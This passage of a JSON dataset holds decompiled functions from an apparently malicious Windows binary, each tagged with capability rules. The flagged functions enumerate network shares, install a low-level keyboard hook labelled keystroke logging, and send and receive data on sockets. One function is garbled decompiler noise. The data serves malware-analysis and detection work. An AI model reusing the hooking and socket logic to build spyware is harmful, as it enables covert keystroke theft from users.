        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0046e840(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint *puStack44;\n    uint *puStack40;\n    int32_t iStack36;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x46eaa0;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x46e867;\n    iVar2 = fcn.004032f8();\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    else {\n        puStack40 = 0x46e87f;\n        fcn.00403358();\n        puStack40 = 0x46e887;\n        var_4h = fcn.004059dc();\n    }\n    puStack40 = 0x46e891;\n    fcn.00405530();\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = NULL;\n    puStack40 = &fcn.0046e840::var_18h;\n    puStack44 = &fcn.0046e840::var_14h;\n    puStack48 = &fcn.0046e840::var_10h;\n    uStack52 = 0xffffffff;\n    puStack56 = &fcn.0046e840::var_8h;\n    uStack60 = 0;\n    iStack64 = var_4h;\n    puStack68 = 0x46e8bd;\n    iVar2 = sub.netapi32.dll_NetShareEnum();\n    if (iVar2 == 0) {\n        iVar2 = var_10h;\n        if (0 < var_10h) {\n            do {\n                iStack76 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb4;\n                iStack72 = var_4h;\n                puStack68 = &stack0xfffffffc;\n                iVar1 = sub.netapi32.dll_NetShareGetInfo();\n                if (iVar1 == 0) {\n                    fcn.00405728();\n                    fcn.00405818();\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46eab8;\n                    uVar3 = *(unaff_EBX + 4);\n                    uVar5 = 0;\n                    fcn.00409e64(uVar3);\n                    fcn.004058e0(puStack40, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x46eab8, *in_EAX);\n                    fcn.004058e0(puStack44);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46eab8;\n                    uVar3 = *(unaff_EBX + 0xc);\n                    uVar5 = 0;\n                    fcn.00409e64(uVar3);\n                    fcn.004058e0(puStack48, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46eab8;\n                    uVar3 = *(unaff_EBX + 0x10);\n                    uVar5 = 0;\n                    fcn.00409e64(uVar3);\n                    fcn.004058e0(uStack52, uVar3, uVar5, uVar6, uVar4);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x46eab8;\n                    uVar3 = *(unaff_EBX + 0x14);\n                    uVar5 = 0;\n                    fcn.00409e64(uVar3);\n                    fcn.004058e0(puStack56, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x46eab8, *in_EAX);\n                    fcn.004058e0(uStack60);\n                    fcn.00405728(0x46eab8, *in_EAX);\n                    fcn.004058e0(iStack64);\n                    fcn.00409e64(*(unaff_EBX + 0x20));\n                    iStack72 = 0x46eac4;\n                    fcn.004058e0();\n                }\n                iStack76 = unaff_EBX;\n                unaff_EBX = iStack76;\n                sub.netapi32.dll_NetApiBufferFree();\n                *in_FS_OFFSET = iStack76;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack64 = var_8h;\n        iStack72 = 0x46ea85;\n        sub.netapi32.dll_NetApiBufferFree();\n    }\n    *in_FS_OFFSET = iStack64;\n    puStack56 = 0x46eaa7;\n    uStack60 = 0x46ea9f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1345
    },
    "0046f264": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0046f264(void)\n\n{\n    int32_t iVar1;\n    \n    *0x495228 = 0;\n    iVar1 = sub.user32.dll_GetWindow();\n    while (iVar1 != 0) {\n        iVar1 = func_0x004081e8(iVar1, 2);\n        *0x495228 = *0x495228 + 1;\n    }\n    iVar1 = *0x495228;\n    *0x495228 = 0;\n    return iVar1;\n}\n",
        "token_count": 116
    },
    "004821a8": {
        "rules": [
            "contain loop",
            "set application hook",
            "log keystrokes via application hook"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.004821a8(void)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    uint uVar3;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_18h = 0x4822d7;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_1ch;\n    var_10h = unaff_EBX;\n    uVar3 = sub.kernel32.dll_GetModuleHandleA_2(0, 0);\n    *0x49b1c0 = sub.user32.dll_SetWindowsHookExA(0xd, fcn.00481bc8, uVar3);\n    fcn.0048b61c();\n    fcn.00405818();\n    cVar2 = fcn.0040a298();\n    if (cVar2 == '\\0') {\n        fcn.0048b61c();\n        fcn.00405818();\n        fcn.0040a2bc();\n    }\n    fcn.0048b61c();\n    fcn.00480fd8(0x4822f0, var_10h);\n    puVar1 = var_14h;\n    fcn.004058e0();\n    fcn.00403770();\n    fcn.00480fd8();\n    fcn.00405584();\n    fcn.00481240();\n    fcn.00405584();\n    fcn.00481240();\n    fcn.00405584();\n    fcn.00481380();\n    fcn.00405584();\n    *in_FS_OFFSET = puVar1;\n    fcn.00405554(0x4822de);\n    return;\n}\n",
        "token_count": 536
    },
    "00482394": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00482394(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x482412;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x482419;\n    uStack32 = 0x482411;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 229
    },
    "00482824": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00482824(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4828a2;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    iVar1 = 0x400;\n    do {\n        fcn.004033e0();\n        fcn.00405718();\n        fcn.00405818();\n        fcn.00405584();\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x4828a9;\n    uStack32 = 0x4828a1;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 235
    },
    "00483998": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.00483998(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uchar uVar1;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 6;\n    do {\n        var_10h = var_10h + -1;\n    } while (var_10h != 0);\n    var_18h = 0x4839bd;\n    var_8h = param_2;\n    fcn.004059cc();\n    var_18h = 0x4839c5;\n    fcn.004059cc();\n    uVar1 = true;\n    var_1ch = 0x483be1;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00483998::var_20h;\n    var_18h = &stack0xfffffffc;\n    fcn.00405974();\n    if (!uVar1) {\n        fcn.00405974();\n        if (!uVar1) {\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048a580();\n                fcn.0040a5dc();\n                var_2ch = var_8h;\n                fcn.004058e0(var_8h, 0x483c1c, var_ch);\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048a580();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048a4b8();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                uVar1 = 1;\n                fcn.0048b61c();\n                fcn.00405864();\n            }\n            fcn.00405974();\n            if (uVar1) {\n                fcn.0048a3f0();\n                fcn.00405864();\n            }\n            goto code_r0x00483bc6;\n        }\n    }\n    fcn.00405584();\ncode_r0x00483bc6:\n    *in_FS_OFFSET = var_2ch;\n    fcn.00405554(0x483be8);\n    return;\n}\n",
        "token_count": 884
    },
    "00486a50": {
        "rules": [
            "contain loop",
            "receive data",
            "send data on socket",
            "send data",
            "receive data on socket"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00486a50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    fcn.004030fc();\n    iVar1 = fcn.004663f8();\n    var_4h = fcn.00404620();\n    fcn.0041b7b4(iVar1, iVar1 >> 0x1f);\n    fcn.0041b994();\n    fcn.0041b750(0, 0);\n    do {\n        fcn.00403af4();\n        iVar1 = (**(*var_4h + 0xc))();\n        if (iVar1 == 0) break;\n        var_4h = 0x49d3a8;\n        sub.wsock32.dll_send(*0x49f3a8, 0x49d3a8, iVar1);\n        sub.wsock32.dll_recv(*0x49f3a8, 0x49d3a8, 0x1fff, 0);\n    } while (iVar1 != 0);\n    fcn.00475ed4();\n    fcn.0040f94c();\n    return;\n}\n",
        "token_count": 280
    },
    "00487b58": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487b58(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    uint *puStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_11h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    puStack40 = 0x487b70;\n    fcn.004059cc();\n    uStack44 = 0x487ca8;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack52 = 0x49f3b0;\n    puStack56 = 0x487b8c;\n    puStack40 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack60 = 0x487c86;\n    puStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack64;\n        puStack56 = 0x487caf;\n        puStack60 = 0x487ca7;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49f3ac + 0xc))();\n            puStack60 = &fcn.00487b58::var_8h;\n            puStack64 = 0x487bea;\n            fcn.00405b28();\n            puStack64 = 0x487bfa;\n            fcn.00405a44();\n            puStack64 = 0x487c07;\n            fcn.00405b28();\n            puStack64 = 0x487c16;\n            fcn.00405a84();\n            puStack64 = &fcn.00487b58::var_ch;\n            iVar2 = fcn.00405b28();\n            uVar3 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405974();\n            if (uVar3) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack64;\n    puStack56 = 0x487c8d;\n    puStack60 = 0x49f3b0;\n    puStack64 = 0x487c85;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 681
    },
    "00487cc8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487cc8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uchar uVar4;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    puStack48 = 0x487ce2;\n    fcn.004059cc();\n    uStack52 = 0x487eb1;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x49f3b0;\n    puStack64 = 0x487cfa;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack68 = 0x487e8f;\n    puStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (iVar1 < 1) {\n        fcn.00404f70();\n        *in_FS_OFFSET = puStack72;\n        puStack64 = 0x487eb8;\n        puStack68 = 0x487eb0;\n        fcn.00405554();\n        return;\n    }\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(**0x49f3ac + 0xc))();\n            puStack60 = &fcn.00487cc8::var_8h;\n            puStack64 = 0x487d58;\n            fcn.00405b28();\n            puStack64 = 0x487d68;\n            fcn.00405a44();\n            puStack64 = 0x487d75;\n            fcn.00405b28();\n            puStack64 = 0x487d84;\n            fcn.00405a84();\n            puStack64 = &fcn.00487cc8::var_ch;\n            puStack68 = 0x487d95;\n            fcn.00405b28();\n            puStack68 = 0x487da5;\n            fcn.00405a44();\n            puStack68 = 0x487db2;\n            fcn.00405b28();\n            puStack68 = 0x487dc1;\n            fcn.00405a84();\n            puStack68 = &fcn.00487cc8::var_10h;\n            puStack72 = 0x487dd2;\n            fcn.00405b28();\n            puStack72 = 0x487de2;\n            fcn.00405a44();\n            puStack72 = 0x487def;\n            fcn.00405b28();\n            puStack72 = 0x487dfe;\n            fcn.00405a84();\n            puStack72 = &fcn.00487cc8::var_14h;\n            iVar2 = fcn.00405b28();\n            uVar4 = iVar2 == 1;\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar4) {\n                uVar3 = fcn.00409ee4();\n                sub.wsock32.dll_closesocket(uVar3);\n                (**(**0x49f3ac + 0x48))();\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = puStack72;\n    puStack64 = 0x487e96;\n    puStack68 = 0x49f3b0;\n    puStack72 = 0x487e8e;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 986
    },
    "00487ecc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00487ecc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint *puStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint *puStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack56 = 0x4880c7;\n    puStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x49f3b0;\n    puStack68 = 0x487ef4;\n    sub.kernel32.dll_EnterCriticalSection();\n    puStack72 = 0x4880a5;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack80 = 0x487f0c;\n    puStack68 = &stack0xfffffffc;\n    iVar1 = (**(**0x49f3ac + 0x14))();\n    if (0 < iVar1) {\n        uStack80 = 0x487f24;\n        var_20h = (**(**0x49f3ac + 0x14))();\n        if (-1 < var_20h + -1) {\n            do {\n                uStack80 = 0x487f48;\n                (**(**0x49f3ac + 0xc))();\n                puStack60 = &fcn.00487ecc::var_4h;\n                puStack64 = 0x487f59;\n                fcn.00405b28();\n                puStack64 = 0x487f69;\n                fcn.00405a44();\n                puStack64 = 0x487f76;\n                fcn.00405b28();\n                puStack64 = 0x487f85;\n                fcn.00405a84();\n                puStack64 = &fcn.00487ecc::var_8h;\n                puStack68 = 0x487f96;\n                fcn.00405b28();\n                puStack68 = 0x487fa6;\n                fcn.00405a44();\n                puStack68 = 0x487fb3;\n                fcn.00405b28();\n                puStack68 = 0x487fc2;\n                fcn.00405a84();\n                puStack68 = &fcn.00487ecc::var_ch;\n                puStack72 = 0x487fd3;\n                fcn.00405b28();\n                puStack72 = 0x487fe3;\n                fcn.00405a44();\n                puStack72 = 0x487ff0;\n                fcn.00405b28();\n                puStack72 = 0x487fff;\n                fcn.00405a84();\n                puStack72 = &fcn.00487ecc::var_10h;\n                puStack76 = 0x488010;\n                fcn.00405b28();\n                puStack76 = 0x488020;\n                fcn.00405a44();\n                puStack76 = 0x48802d;\n                fcn.00405b28();\n                puStack76 = 0x48803c;\n                fcn.00405a84();\n                puStack76 = 0x488047;\n                fcn.004055c8();\n                uStack80 = 0x48806d;\n                iStack84 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffac;\n                puStack76 = &stack0xfffffffc;\n                iVar1 = fcn.00409ee4();\n                sub.wsock32.dll_closesocket();\n                *in_FS_OFFSET = iVar1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n        uStack80 = 0x48808d;\n        (**(**0x49f3ac + 0x44))();\n        *in_FS_OFFSET = puStack76;\n        puStack68 = 0x4880ac;\n        puStack72 = 0x49f3b0;\n        puStack76 = 0x4880a4;\n        sub.kernel32.dll_LeaveCriticalSection();\n        return;\n    }\n    uStack80 = 0x487f15;\n    fcn.00404f70();\n    *in_FS_OFFSET = puStack76;\n    puStack68 = 0x4880ce;\n    puStack72 = 0x4880c6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1108
    },
    "0048a1bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048a1bc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x48a23b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.004033b8();\n    fcn.00405530();\n    if (0 < in_EAX) {\n        do {\n            fcn.004033e0();\n            fcn.00405718();\n            fcn.00405818();\n            fcn.00405584();\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48a242;\n    uStack32 = 0x48a23a;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 243
    },
    "0048acd0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0048acd0(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x48ae64;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0048acd0::var_24h;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    fcn.00405530();\n    piVar1 = fcn.00421670();\n    piVar2 = fcn.00404620();\n    fcn.0042174c();\n    fcn.00421890();\n    fcn.00421d84();\n    iVar3 = (**(*piVar2 + 0x14))();\n    if (-1 < iVar3 + -1) {\n        var_20h = 0;\n        var_24h = iVar3;\n        do {\n            (**(*piVar2 + 0xc))();\n            fcn.00405864();\n            fcn.00421890();\n            fcn.00422014();\n            fcn.00422014();\n            fcn.00422014();\n            fcn.00422014();\n            fcn.00422014();\n            (**(*piVar2 + 0xc))(*var_1ch);\n            var_4h = 0x48af6c;\n            var_8h = var_ch;\n            var_ch = 0x48af6c;\n            var_14h = 0x48af6c;\n            var_18h = 0x48af6c;\n            var_1ch = 0x48af6c;\n            var_20h = 0x48af6c;\n            var_24h = 0x48af78;\n            fcn.004058e0();\n            var_20h = var_20h + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    fcn.00404650();\n    fcn.0042171c();\n    (**(*piVar1 + -4))();\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x48ae6b;\n    var_20h = 0x48ae56;\n    fcn.00405554();\n    var_20h = 0x48ae63;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 771
    },
    "0048ed44": {
        "rules": [
            "accept command line arguments"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.0048ed44(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    char cVar4;\n    uint8_t uVar5;\n    char cVar6;\n    char cVar11;\n    uint32_t in_EAX;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    char cVar12;\n    uint8_t *puVar13;\n    char cVar14;\n    char cVar16;\n    int32_t unaff_EBX;\n    uint32_t *puVar15;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    ushort in_ES;\n    char in_CF;\n    \n    uVar3 = in_EAX + '\\x1f' + in_CF;\n    uVar1 = in_EAX & 0xffffff00;\n    pcVar7 = uVar1 | uVar3;\n    puVar15 = unaff_EBX + 1;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    cVar12 = param_1;\n    *pcVar7 = *pcVar7 + cVar12;\n    pcVar7 = param_1 + unaff_EDI * 8;\n    cVar4 = puVar15 >> 8;\n    *pcVar7 = *pcVar7 + cVar4;\n    pcVar7 = (uVar1 | uVar3 + 0x49) + 0x6c004905;\n    *pcVar7 = *pcVar7 + (param_1 >> 8);\n    uVar3 = ((uVar3 + 0x49) - *puVar15 & 4) + (uVar1 >> 8);\n    pcVar7 = uVar1 | uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    cVar6 = param_2 + 2 >> 8;\n    pcVar7[&stack0x00000000] = pcVar7[&stack0x00000000] + cVar6;\n    pcVar7[param_1 + 0x4bc0041] = pcVar7[param_1 + 0x4bc0041] + (param_1 + -2 >> 8);\n    pcVar7 = uVar1 | uVar3 + cVar4 | *puVar15;\n    uVar3 = pcVar7;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *0x12400049 = *0x12400049 + uVar3;\n    pcVar7[5] = pcVar7[5] + uVar3;\n    uVar3 = ((uVar3 + (cVar12 - 4U)) - *(unaff_EBX + 2)) - CARRY1(uVar3, cVar12 - 4U);\n    pcVar8 = pcVar7 & 0xffffff00 | uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    pcVar8[-0x7e] = pcVar8[-0x7e] + ((pcVar7 & 0xffffff00) >> 8);\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    *pcVar8 = *pcVar8 + uVar3;\n    pcVar8[-0x2fffb6fb] = pcVar8[-0x2fffb6fb] + cVar6;\n    cVar6 = param_2 + 2;\n    uVar1 = &stack0x00000001 & 0xffff0000;\n    uVar2 = CONCAT11((&stack0x00000001 >> 8) + cVar6, 1);\n    pcVar10 = uVar1 | uVar2;\n    *(pcVar8 + -4) = in_ES;\n    *pcVar10 = *pcVar10 + cVar6;\n    cVar6 = uVar2 >> 8;\n    pcVar10[unaff_EDI + 0x49] = pcVar10[unaff_EDI + 0x49] + cVar6;\n    pcVar7 = param_1 + -6 + (unaff_EBP + 1) * 8;\n    *pcVar7 = *pcVar7 + cVar6;\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    *pcVar10 = *pcVar10 + '\\x01';\n    